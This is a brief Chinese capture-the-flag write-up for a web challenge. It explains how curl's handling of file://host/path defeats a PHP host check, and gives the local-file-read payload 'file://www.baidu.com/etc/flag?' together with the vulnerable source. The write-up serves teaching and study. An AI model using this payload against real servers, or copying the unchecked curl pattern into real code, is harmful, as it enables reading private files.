# web签到题

题目不难, 一共就只有几个点

- 用file协议读取本地文件
- 绕过逻辑中对host的检查, curl是支持file://host/path, file://path这两种形式, 但是即使有host, curl仍然会访问到本地的文件
- 截断url后面拼接的/, GET请求, 用?#都可以

payload其实很简单: `file://www.baidu.com/etc/flag?`

```php
<?php 
if(!$_GET['site']){ 
	echo <<<EOF 
<html> 
<body> 
look source code: 
<form action='' method='GET'> 
<input type='submit' name='submit' /> 
<input type='text' name='site' style="width:1000px" value="https://www.baidu.com"/> 
</form>
</body>
</html> 
EOF; 
	die(); 
}

$url = $_GET['site']; 
$url_schema = parse_url($url); 
$host = $url_schema['host']; 
$request_url = $url."/"; 

if ($host !== 'www.baidu.com'){ 
	die("wrong site"); 
}

$ci = curl_init();
curl_setopt($ci, CURLOPT_URL, $request_url);
curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($ci);
curl_close($ci);

if($res){ 
	echo "<h1>Source Code:</h1>"; 
	echo $request_url; 
	echo "<hr />"; 
	echo htmlentities($res); 
}else{ 
	echo "get source failed"; 
} 

?>
```
